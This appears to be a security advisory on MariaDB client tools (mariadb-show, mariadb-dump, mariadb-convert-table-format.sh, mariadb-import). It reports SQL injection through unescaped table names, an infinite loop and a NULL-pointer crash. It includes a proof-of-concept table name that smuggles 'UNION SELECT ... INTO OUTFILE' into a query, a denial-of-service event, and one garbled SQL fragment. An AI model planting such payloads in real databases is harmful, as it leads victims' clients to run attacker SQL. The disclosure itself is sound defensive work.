## Vulnerability Details

`mariadb-show` (and to a lesser extent `mariadb-dump` and `mariadb-convert-table-format.sh`) may be tricked into executing malicious SQL if run against an attacker controlled database due to dynamically generated queries not escaping user controlled values.

`mariadb-dump` contains additional issues that may lead to client-side DoS / buffer overflow issues.


## mariadb-show --count --verbose

`mariadb-show` may EXECUTE malicious queries when used as above because table names returned from `SHOW TABLES` end up being used without escaping in a ``SELECT COUNT(*) FROM `%s`;`` query.

[client/mysqlshow.c](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlshow.c#L606-L623)
```c++
/* Print the count of rows for each table */
my_snprintf(query, sizeof(query), "SELECT COUNT(*) FROM `%s`",
            row[0]);

if (!(mysql_query(mysql,query)))
...
```

### Proof of Concept

```sql
CREATE TABLE poc(i INT);
INSERT INTO poc VALUES (1), (2), (3);

CREATE TABLE `poc`` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#`(i INT);

SHOW TABLES;
-- poc
-- poc` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#
```

`mariadb-show` can then be tricked into executing

```sql
SELECT COUNT(*) FROM `poc` HAVING 0 UNION SELECT user() INTO OUTFILE '/tmp/show_p'#`
```

> ```
> root@localhost
> ```


## mariadb-convert-table-format.sh

Table names are also not escaped in `mariadb-convert-table-format.sh`, but the `SHOW TABLE STATUS` injection doesn't give a lot of room for an attacker to player with. It's possible to inject a single quote `'` or `LIKE` wildcards if needed.

[scripts/mysql_convert_table_format.sh:99](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/scripts/mysql_convert_table_format.sh#L99)


```sql
  id INT

  id INT
) ENGINE=InnoDB;
```

## mariadb-dump --events (infinite loop)

`mariadb-dump --events` tries to create a delimiter not present in the event body, but because `create_delimiter()` increments `delimiter_max_size` instead of `proposed_length` during the loop, the proposed delimiter is always stuck as `;;` - causing an infinite loop if `;;` is already present.

[client/mysqldump.cc:2674](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqldump.cc#L2674-L2695)
```c++
static char *create_delimiter(char *query, char *delimiter_buff, 
                              int delimiter_max_size) 
{
  int proposed_length;
  char *presence;


  delimiter_buff[0]= ';';  /* start with one semicolon, and */


  for (proposed_length= 2; proposed_length < delimiter_max_size; 
      delimiter_max_size++) {


    delimiter_buff[proposed_length-1]= ';';  /* add semicolons, until */
    delimiter_buff[proposed_length]= '\0';


    presence = strstr(query, delimiter_buff);
    if (presence == NULL) { /* the proposed delimiter is not in the query. */
       return delimiter_buff;
    }


  }
  return NULL;  /* but if we run out of space, return nothing at all. */
}
```

### Proof of Concept

```sql
CREATE EVENT e_low_hang
ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 1 DAY
DO SELECT ';;' AS marker;
```

## (BONUS BUG) mariadb-import

`mariadb-import --lock-tables` crashes the client for ordinary direct-file imports. The root cause is that the direct-file branch iterates `argv` to build `files_to_load`, leaving `argv` pointing at the final `NULL`.

The later `--lock-tables` path still passes the original remaining argument count plus the now-exhausted pointer to `lock_table()`, which then calls `fn_format()` with a `NULL` filename.

[client/mysqlimport.cc:L1318](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/client/mysqlimport.cc#L1318-L1322)
```c++
for (; *argv != NULL; argv++)
{
  table_load_params p(*argv, "", current_db, 0);
  files_to_load.push_back(p);
}
...

if (lock_tables)
  lock_table(mysql, argc, argv);
```

[client/mysqlimport.cc:840](https://github.com/MariaDB/server/blob/main/client/mysqlimport.cc#L840-L857)
